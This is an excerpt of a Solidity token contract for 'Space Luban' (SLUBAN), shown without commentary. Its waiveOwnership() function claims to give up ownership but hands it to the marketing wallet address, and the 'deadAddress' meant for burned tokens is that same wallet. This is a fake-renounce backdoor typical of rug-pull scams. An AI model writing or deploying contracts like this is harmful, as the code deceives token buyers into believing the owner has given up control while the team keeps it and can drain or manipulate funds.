...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x48dd27A0730F26554483057b9846d808c6ae2Cfb));
        _owner = address(0x48dd27A0730F26554483057b9846d808c6ae2Cfb);
    }
...
contract SpaceLuban is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Space Luban";
    string private _symbol = "SLUBAN";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x48dd27A0730F26554483057b9846d808c6ae2Cfb);
    address payable public teamWalletAddress = payable(0x1fA596B68d53BDD5CC6eC5B605819d61a71F2199);
    address public immutable deadAddress = 0x48dd27A0730F26554483057b9846d808c6ae2Cfb;
